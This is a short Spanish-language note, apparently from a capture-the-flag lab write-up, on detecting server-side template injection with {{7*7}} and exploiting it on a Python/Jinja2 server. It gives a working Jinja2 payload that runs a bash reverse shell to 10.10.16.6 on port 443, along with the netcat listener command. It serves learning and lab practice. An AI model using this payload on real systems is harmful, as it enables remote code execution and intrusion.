Es una vulnerabilidad de seguridad en la que un atacante puede inyectar código malicioso en una **plantilla** de servidor.

----
# Enumeracion
Esta vulnerabilidad, normalmente se prueba poniendo {{7\*7}} (esta capado con \) y si responde 49 lo mas probable es que se de esta vulnerabilidad 
![[Goodgames19.png]]

# Explotacion
Como funciono el {{7*\7}}  y nos dio 49, pensamos que es un SSTI      | esta capado con \ 
Probamos este payload, por que como en wapallyzer vemos que esta corriendo python3, asumimos que se esta puyede estar usando jinja2. Nos vamos a mandar una reverse shell [Articulo del que sacamos la linea del comando](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2)

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/10.10.16.6/443 0>&1"').read() }} 
```

Mientras nos ponemos en escucha por el puerto 443 en nuestra maquina con el comando
`nc -nlvp 443`


![[Goodgames13.png]]